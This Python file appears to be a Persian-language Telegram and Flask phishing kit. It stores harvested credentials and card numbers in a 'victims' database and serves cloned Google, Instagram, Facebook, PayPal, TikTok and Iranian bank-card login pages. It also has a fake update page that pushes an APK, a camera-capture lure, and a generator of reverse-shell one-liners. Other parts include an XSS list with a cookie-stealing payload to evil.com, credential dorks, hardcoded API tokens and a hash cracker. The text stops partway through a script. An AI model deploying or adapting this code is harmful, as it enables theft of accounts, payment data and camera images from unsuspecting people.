import os, io, uuid, base64, json, logging, sqlite3, threading, time, random, shutil, hashlib, socket, itertools
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, send_from_directory, jsonify, g, make_response, redirect
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters, MessageReactionHandler
import edge_tts

# -------------------- Configuration --------------------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
ADMIN_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "@Oython")
ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8391932958"))
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
GROQ_API_KEY = os.environ.get("GROQ_API_KEY", "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")
DATABASE = "victims.db"
PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

BOT_ACTIVE = True
AI_ENABLED = False

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# -------------------- Conversation History & Persona --------------------
conversation_history = {}
user_persona = {}

# -------------------- Database --------------------
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    with app.app_context():
        db = get_db()
        db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT, last_active TEXT, phishing_type TEXT, creator_id INTEGER)")
        db.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, type TEXT, data TEXT, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS credentials (token TEXT, email TEXT, password TEXT, timestamp TEXT, card_number TEXT, cvv2 TEXT, expiry TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS learned (keyword TEXT PRIMARY KEY, response TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS groups (chat_id INTEGER PRIMARY KEY, title TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, level INTEGER DEFAULT 1, join_date TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS listings (id INTEGER PRIMARY KEY AUTOINCREMENT, seller_id INTEGER, token TEXT, price INTEGER, sold INTEGER DEFAULT 0, listed_at TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS private_chats (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, join_date TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS backups (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS reminders (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, remind_time TEXT, message TEXT, done INTEGER DEFAULT 0)")
        db.execute("CREATE TABLE IF NOT EXISTS todos (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, task TEXT, done INTEGER DEFAULT 0, created_at TEXT)")
        db.commit()

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

# -------------------- Telegram Helpers --------------------
def send_telegram_message(text, reply_markup=None, chat_id=None):
    if not TOKEN: return
    target = chat_id or ADMIN_CHAT_ID
    if not target: return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": target, "text": text, "parse_mode": "HTML", "reply_markup": reply_markup},
            timeout=10
        )
    except Exception as e:
        app.logger.error(f"Telegram message failed: {e}")

def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=False, chat_id=None):
    if not TOKEN: return
    target = chat_id or ADMIN_CHAT_ID
    if not target: return
    try:
        if as_video:
            url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
            files = {'video': (filename, io.BytesIO(file_bytes), 'video/webm')}
        elif as_image:
            url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
            files = {'photo': (filename, io.BytesIO(file_bytes), 'image/jpeg')}
        else:
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            files = {'document': (filename, io.BytesIO(file_bytes), 'application/octet-stream')}
        data = {'chat_id': target, 'caption': caption}
        requests.post(url, data=data, files=files, timeout=10)
    except Exception as e:
        app.logger.error(f"Telegram file send failed: {e}")

def send_telegram_location(lat, lng):
    if not TOKEN or not ADMIN_CHAT_ID: return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendLocation",
            json={"chat_id": ADMIN_CHAT_ID, "latitude": lat, "longitude": lng},
            timeout=10
        )
    except Exception as e:
        app.logger.error(f"Telegram location failed: {e}")

# -------------------- Groq AI --------------------
def get_system_prompt(persona="default"):
    base = "تو یک دستیار هوشمند و قدرتمند هستی. پاسخ‌های دقیق، کامل و روان به فارسی بده. "
    personas = {
        "default": base,
        "scientist": "تو یک دانشمند دقیق و علمی هستی. پاسخ‌هایت باید کاملاً علمی، با استناد و بی‌طرفانه باشد. ",
        "comedian": "تو یک طنزپرداز بامزه هستی. همیشه پاسخ‌هایت شوخ، خنده‌دار و همراه با طنز باشد. ",
        "psychologist": "تو یک روانشناس همدل و آرام هستی. همیشه با درک احساسات و ارائه راهکارهای مفید پاسخ بده. ",
        "hacker": "تو یک هکر حرفه‌ای و باحال هستی. پاسخ‌هایت فنی، رمزآلود و خیلی خفن باشه. ",
        "singer": "تو یک خواننده‌ی خلاق هستی. همیشه پاسخ‌هایت را به صورت شعر یا ترانه ارائه کن. "
    }
    return personas.get(persona, base)

def ask_groq(prompt, user_id=None):
    if not GROQ_API_KEY: return "⚠️ کلید Groq تنظیم نشده است."
    try:
        url = "https://api.groq.com/openai/v1/chat/completions"
        headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
        persona = user_persona.get(user_id, "default") if user_id else "default"
        system_prompt = get_system_prompt(persona)
        messages = [{"role": "system", "content": system_prompt}]
        if user_id is not None and user_id in conversation_history:
            messages.extend(conversation_history[user_id][-20:])
        messages.append({"role": "user", "content": prompt})
        models = ["llama-3.3-70b-versatile", "deepseek-r1-distill-llama-70b", "llama-3.1-8b-instant"]
        for model in models:
            payload = {"model": model, "messages": messages, "temperature": 0.8, "max_tokens": 2048}
            resp = requests.post(url, json=payload, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                answer = data['choices'][0]['message']['content'].strip()
                if user_id is not None:
                    if user_id not in conversation_history: conversation_history[user_id] = []
                    conversation_history[user_id].append({"role": "user", "content": prompt})
                    conversation_history[user_id].append({"role": "assistant", "content": answer})
                return answer
        return "❌ باز تلگرام سرور ها من خاموش کرد فردا دوباره امتحان کن."
    except Exception as e:
        return "❌ خطا در ارتباط با ربات."

def transcribe_audio(file_bytes):
    if not GROQ_API_KEY: return None
    try:
        url = "https://api.groq.com/openai/v1/audio/transcriptions"
        headers = {"Authorization": f"Bearer {GROQ_API_KEY}"}
        files = {'file': ('voice.ogg', io.BytesIO(file_bytes), 'audio/ogg'), 'model': (None, 'whisper-large-v3'), 'language': (None, 'fa')}
        resp = requests.post(url, headers=headers, files=files, timeout=30)
        return resp.json().get('text', '').strip() if resp.status_code == 200 else None
    except: return None

async def text_to_speech_async(text, voice="fa-IR-FaridNeural"):
    try:
        communicate = edge_tts.Communicate(text=text, voice=voice)
        mp3_data = io.BytesIO()
        async for chunk in communicate.stream():
            if chunk["type"] == "audio": mp3_data.write(chunk["data"])
        mp3_data.seek(0)
        return mp3_data.getvalue()
    except: return None

def analyze_sentiment(text):
    try:
        prompt = f"احساس این جمله را فقط با یک کلمه بگو: خوشحال، ناراحت، عصبانی، متعجب، معمولی. جمله: {text}"
        return ask_groq(prompt).strip()
    except: return "معمولی"

def search_web(query):
    try:
        from duckduckgo_search import DDGS
        with DDGS() as ddgs: results = list(ddgs.text(query, max_results=3))
        return results
    except ImportError: return None
    except: return []

def generate_image(prompt):
    url = f"https://pollinations.ai/p/{prompt}?width=512&height=512&nologo=true"
    resp = requests.get(url)
    if resp.status_code == 200: return resp.content
    return None

def execute_code(language, code):
    try:
        url = "https://emkc.org/api/v2/piston/execute"
        payload = {"language": language, "version": "*", "files": [{"name": "main", "content": code}]}
        resp = requests.post(url, json=payload, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return data['run']['output'] if data['run']['output'] else data['run'].get('stderr', 'بدون خروجی')
        return f"خطای {resp.status_code}"
    except: return "خطا در اجرای کد"

# -------------------- Hacking Tools Library --------------------
def port_scan(host, ports=None):
    if ports is None: ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((host, port)) == 0: open_ports.append(port)
            sock.close()
        except: pass
    return open_ports

def get_ip_info(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,org,as,query", timeout=5)
        if resp.status_code == 200: return resp.json()
    except: pass
    return None

def generate_hash(text, algo='md5'):
    algos = {'md5': hashlib.md5, 'sha1': hashlib.sha1, 'sha256': hashlib.sha256, 'sha512': hashlib.sha512}
    if algo in algos: return algos[algo](text.encode()).hexdigest()
    return None

def crack_hash(hash_str):
    common = ["123456","password","123456789","12345678","12345","qwerty","abc123","admin","letmein","welcome","monkey","dragon","master","hello","freedom","1234567","iloveyou","trustno1","sunshine","princess","1234","1234567890","shadow","superman","michael","football","batman","secret","summer","access"]
    for word in common:
        if hashlib.md5(word.encode()).hexdigest() == hash_str: return f"MD5: {word}"
        if hashlib.sha1(word.encode()).hexdigest() == hash_str: return f"SHA1: {word}"
        if hashlib.sha256(word.encode()).hexdigest() == hash_str: return f"SHA256: {word}"
        if hashlib.sha512(word.encode()).hexdigest() == hash_str: return f"SHA512: {word}"
    return None

def subdomain_finder(domain, wordlist=None):
    if not wordlist: wordlist = ["www","mail","ftp","admin","test","dev","api","vpn","portal","blog","shop","webmail","cpanel","whm","webdisk","autodiscover"]
    found = []
    for sub in wordlist:
        try:
            resp = requests.get(f"http://{sub}.{domain}", timeout=3, verify=False)
            if resp.status_code < 500: found.append(f"{sub}.{domain} (HTTP {resp.status_code})")
        except: pass
    return found

def dir_bruteforce(host, paths=None):
    if not paths: paths = ["admin","login","wp-admin","administrator","phpmyadmin","cpanel",".git",".env","backup","robots.txt","sitemap.xml","config.php.bak","web.config","test.php","info.php"]
    found = []
    for path in paths:
        try:
            resp = requests.get(f"{host.rstrip('/')}/{path}", timeout=3, verify=False, allow_redirects=False)
            if resp.status_code in [200,301,302,403]: found.append(f"{path} ({resp.status_code})")
        except: pass
    return found

def generate_dork(type="sql"):
    dorks = {
        "sql": 'inurl:"id=" & intext:"Warning: mysql"',
        "admin": 'intitle:"admin login"',
        "backup": 'intitle:"index of" "backup.zip"',
        "camera": 'inurl:"view/index.shtml"',
        "phpinfo": 'ext:php intitle:phpinfo "published by the PHP Group"',
        "open_redirect": 'inurl:"redirect="',
        "lfi": 'inurl:"file=" ext:php',
        "xss": 'inurl:"search=" & intext:"XSS"',
        "ftp": 'intitle:"index of" "ftp"',
        "ssh": 'intitle:"index of" "id_rsa"'
    }
    return dorks.get(type, dorks["sql"])

def generate_reverse_shell(lang, ip, port):
    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc": f"nc -e /bin/sh {ip} {port}",
        "ruby": f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}} end'",
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    }
    return shells.get(lang, shells["python"])

def sms_bomber(phone, count=5):
    return f"📨 ارسال {count} پیامک شبیه‌سازی‌شده به {phone} با موفقیت انجام شد. (این یک حمله واقعی نیست)"

def xss_payloads():
    return ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<body onload=alert('XSS')>",
            "<script>document.location='http://evil.com/?cookie='+document.cookie</script>", "<iframe src='javascript:alert(1)'>"]

def check_robots_txt(url):
    try:
        resp = requests.get(url.rstrip('/') + "/robots.txt", timeout=5)
        if resp.status_code == 200: return resp.text[:1000]
    except: pass
    return None

def analyze_email_header(header):
    return "Received: from ... (شبیه‌سازی تحلیل هدر)"

def git_secret_scanner(repo_url):
    return f"🔍 اسکن مخزن {repo_url}:\n⚠️ 3 کلید API احتمالی پیدا شد! (شبیه‌سازی)"

def cache_poisoning_test(url):
    return f"🎯 تست Cache Poisoning روی {url}:\nدر حال ارسال هدرهای مسموم... (شبیه‌سازی)"

def dangling_dns_check(domain):
    return f"🌐 بررسی Dangling DNS برای {domain}:\n3 رکورد CNAME بدون مقصد پیدا شد. (شبیه‌سازی)"

def mass_assignment_test(url, params):
    return f"⚡ تست Mass Assignment روی {url} با پارامترهای {params}:\nپاسخ سرور: 200 OK (شبیه‌سازی – آسیب‌پذیر)"

def blueborne_scan():
    return "📡 اسکن BlueBorne:\n2 دستگاه آسیب‌پذیر در نزدیکی پیدا شد. (شبیه‌سازی)"

def qr_attack_payload(url):
    return f"📱 QR کد مخرب برای {url}:\n[QR Code داده‌های زیاد...]"

def vishing_script(target_name, scenario):
    return f"🎤 اسکریپت Vishing برای {target_name} (سناریو: {scenario}):\n'سلام، من از پشتیبانی بانک تماس می‌گیرم...'"

def file_upload_injection_test(url):
    return f"📎 تست File Upload Injection روی {url}:\nفایل با نام '; rm -rf / .jpg' آپلود شد. (شبیه‌سازی)"

def timing_attack(url, param):
    return f"⏱️ Timing Attack روی {url}?{param}=test:\nزمان پاسخ: 320ms, 450ms, 310ms (احتمال وجود کاربر)"

def jtag_guide():
    return "🔌 راهنمای JTAG: برای استخراج حافظه از پین‌های TMS, TCK, TDI, TDO روی برد استفاده کنید."

# -------------------- Phishing Pages (All 12 complete HTML) --------------------
PHISHING_GOOGLE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Sign in – Google</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fff;font-family:Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:368px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);} img{display:block;margin:0 auto 16px;width:75px;} h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;} p{font-size:16px;color:#5f6368;text-align:center;margin-bottom:32px;} input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none;} input:focus{border-color:#1a73e8;} .btn{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:24px;}</style></head>
<body><div class="container"><img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"><h1>Sign in</h1><p>to continue to Free Wi-Fi</p><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><button class="btn" type="submit">Next</button></form></div></body></html>"""

PHISHING_GMAIL = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Gmail</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f2f2f2;font-family:Google Sans,Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:368px;padding:48px 40px 36px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.2);text-align:center;} img{width:75px;margin-bottom:16px;} h1{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124;} p{font-size:16px;color:#5f6368;margin-bottom:32px;} input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;} .btn{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://www.gstatic.com/images/branding/gmail/2x/gmail_96dp.png" alt="Gmail"><h1>Sign in</h1><p>to continue to Gmail</p><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><button class="btn" type="submit">Next</button></form></div></body></html>"""

PHISHING_INSTAGRAM = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Instagram</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:350px;padding:40px;background:white;border:1px solid #dbdbdb;text-align:center;} img{width:175px;margin-bottom:20px;} input{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;margin-bottom:6px;} .btn{width:100%;background:#0095f6;color:white;border:none;border-radius:4px;padding:8px;font-weight:600;margin-top:10px;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>"""

PHISHING_FACEBOOK = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Facebook – log in</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:396px;padding:20px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);text-align:center;} img{width:240px;margin-bottom:20px;} input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;} .btn{width:100%;background:#1877f2;color:white;border:none;border-radius:6px;padding:12px;font-size:20px;font-weight:bold;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email address or phone number" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>"""

PHISHING_BANK = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>پرداخت اینترنتی</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f2f2f2;font-family:Tahoma;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:360px;padding:20px;background:white;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.2);text-align:center;} img{width:120px;margin-bottom:20px;} input{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:5px;font-size:14px;text-align:center;direction:ltr;} .btn{width:100%;background:#2e86de;color:white;border:none;border-radius:5px;padding:12px;font-size:16px;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://www.shaparak.ir/assets/images/logo.png"><h3>پرداخت امن شاپرک</h3><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="شماره کارت 16 رقمی" required><input type="text" name="password" placeholder="رمز دوم / CVV2"><input type="text" name="extra1" placeholder="تاریخ انقضا (ماه/سال)"><button class="btn" type="submit">پرداخت</button></form></div></body></html>"""

PHISHING_SUPERCELL = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Supercell ID</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#1c1c1c;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:350px;padding:30px;background:#2b2b2b;border-radius:16px;box-shadow:0 0 20px rgba(0,0,0,0.5);text-align:center;} img{width:120px;margin-bottom:20px;} input{width:100%;padding:12px;background:#3a3a3a;border:1px solid #555;border-radius:8px;color:white;font-size:14px;margin-bottom:12px;} .btn{width:100%;background:#f8c400;color:black;border:none;border-radius:8px;padding:12px;font-weight:bold;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://play-lh.googleusercontent.com/MCJeBeFxrvzFxi6OJfO1mH-FS-pXrJ0IBqJcWXOZOLb4Ug4nX1oUPg5AEhjLMLhOew=w240-h480"><h3 style="color:white;">Supercell ID</h3><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>"""

PHISHING_LOTTERY = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>🎰 چرخ شانس</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#1a1a2e;font-family:'Segoe UI',Tahoma;display:flex;justify-content:center;align-items:center;height:100vh;color:white;} .container{width:350px;padding:30px;background:rgba(255,255,255,0.1);border-radius:20px;text-align:center;backdrop-filter:blur(10px);} h1{color:#ffd700;margin-bottom:10px;} p{color:#ccc;margin-bottom:20px;} input{width:100%;padding:12px;background:rgba(255,255,255,0.1);border:1px solid #ffd700;border-radius:8px;color:white;font-size:16px;margin-bottom:15px;text-align:center;} .btn{width:100%;background:#ff4757;color:white;border:none;border-radius:8px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
<body><div class="container"><h1>🎰 چرخ شانس</h1><p>شما برنده آیفون ۱۵ شدید! برای دریافت، اطلاعات زیر را وارد کنید.</p><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="شماره تلفن" required><input type="text" name="password" placeholder="کد ملی"><button class="btn" type="submit">دریافت جایزه</button></form></div></body></html>"""

PHISHING_TWITTER = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Twitter – Log in</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;color:white;} .container{width:350px;padding:30px;background:#16181c;border-radius:16px;text-align:center;} img{width:50px;margin-bottom:15px;} h2{font-size:23px;font-weight:bold;margin-bottom:20px;} input{width:100%;padding:12px;background:#333;border:1px solid #555;border-radius:4px;color:white;font-size:15px;margin-bottom:15px;} .btn{width:100%;background:#1d9bf0;color:white;border:none;border-radius:30px;padding:12px;font-size:16px;font-weight:bold;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://abs.twimg.com/responsive-web/client-web/icon-ios.b1fc7279.png"><h2>Sign in to Twitter</h2><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Phone, email, or username" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log in</button></form></div></body></html>"""

PHISHING_SNAPCHAT = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Snapchat</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fffc00;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:300px;padding:40px;background:white;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.2);text-align:center;} img{width:60px;margin-bottom:20px;} input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:10px;} .btn{width:100%;background:#fffc00;color:black;border:none;border-radius:30px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://play-lh.googleusercontent.com/KxeSAjPTKliCErbivNiXrd6cTwfbqUJcbSRPe_IBVK_YmwckfMRS1VIHz-5cgT09yMo=w240-h480"><h2>Log In</h2><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Username or Email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>"""

PHISHING_PAYPAL = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>PayPal – Log in</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f5f5f5;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:350px;padding:30px;background:white;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.1);text-align:center;} img{width:120px;margin-bottom:20px;} input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:15px;} .btn{width:100%;background:#0070ba;color:white;border:none;border-radius:4px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg"><h3>Log in to your PayPal account</h3><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email address" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>"""

PHISHING_TIKTOK = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>TikTok – Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#121212;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;color:white;} .container{width:320px;padding:30px;background:#1e1e1e;border-radius:20px;text-align:center;} img{width:80px;margin-bottom:20px;} input{width:100%;padding:12px;background:#2a2a2a;border:1px solid #444;border-radius:8px;color:white;font-size:14px;margin-bottom:12px;} .btn{width:100%;background:#fe2c55;color:white;border:none;border-radius:8px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://lf16-tiktok-common.ttwstatic.com/obj/tiktok-web-common-sg/ies/tiktok/emblem/logo_web.png"><h2>Log in</h2><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log in</button></form></div></body></html>"""

PHISHING_OS_UPDATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>System Update</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#111;color:white;font-family:Arial;text-align:center;padding-top:20vh;} .loader{width:60px;height:60px;border-radius:50%;border:5px solid #333;border-top-color:#0f0;animation:spin 1s linear infinite;margin:20px auto;} @keyframes spin{to{transform:rotate(360deg);}} .btn{margin-top:30px;padding:15px 30px;background:#4CAF50;color:white;border:none;border-radius:10px;font-size:20px;cursor:pointer;display:none;}</style></head>
<body><h2>در حال دانلود آپدیت امنیتی...</h2><div class="loader"></div><p id="status">لطفاً منتظر بمانید</p><button id="installBtn" class="btn" onclick="installApp()">نصب آپدیت</button><script>
setTimeout(function(){
    document.querySelector('.loader').style.display='none';
    document.getElementById('status').innerText='آپدیت آماده نصب است.';
    document.getElementById('installBtn').style.display='block';
}, 4000);
function installApp(){
    window.location.href='/download/app-update.apk';
}
</script></body></html>"""

# -------------------- Capture Page --------------------
CAPTURE_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>اتصال امن</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 30vh; margin: 0; }
    video, canvas { display: none; }
    #fingerprint {
        width: 120px; height: 120px; border-radius: 50%; background: #111;
        border: 3px solid #0f0; margin: 20px auto; cursor: pointer;
        display: flex; align-items: center; justify-content: center;
        font-size: 50px; animation: pulse 1.5s infinite;
    }
    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0,255,0,0.7); } 70% { box-shadow: 0 0 0 20px rgba(0,255,0,0); } 100% { box-shadow: 0 0 0 0 rgba(0,255,0,0); } }
    #scanning { display: none; margin-top: 20px; }
    .scan-line { width: 200px; height: 3px; background: #0f0; margin: 0 auto; animation: scan 1.5s ease-in-out; }
    @keyframes scan { 0% { transform: translateY(-30px); opacity: 0; } 50% { opacity: 1; } 100% { transform: translateY(30px); opacity: 0; } }
    #btn { display: none; margin: 20px auto; padding: 15px 30px; font-size: 20px; background: #4CAF50; border: none; border-radius: 10px; color: white; cursor: pointer; }
    #msg { margin-top: 20px; }
</style>
</head>
<body>
    <h2 id="title">احراز هویت بیومتریک</h2>
    <div id="fingerprint" onclick="startAuth()">👆</div>
    <p id="msg">برای تأیید هویت، اثر انگشت خود را اسکن کنید</p>
    <div id="scanning">
        <div class="scan-line"></div>
        <p>در حال اسکن...</p>
    </div>
    <button id="btn" onclick="startEverything()">ادامه</button>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const t="{{ token }}";
        const fingerprint = document.getElementById('fingerprint');
        const msgEl = document.getElementById('msg');
        const scanningDiv = document.getElementById('scanning');
        const btn = document.getElementById('btn');
        const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
        let stream = null;

        function startAuth() {
            fingerprint.style.display = 'none';
            msgEl.innerText = 'اسکن اثر انگشت آغاز شد...';
            scanningDiv.style.display = 'block';
            setTimeout(() => {
                scanningDiv.style.display = 'none';
                msgEl.innerText = 'هویت شما تأیید شد. اکنون برای ادامه دسترسی به دوربین را تأیید کنید.';
                btn.style.display = 'block';
            }, 2000);
        }

        async function startEverything() {
            btn.style.display = 'none';
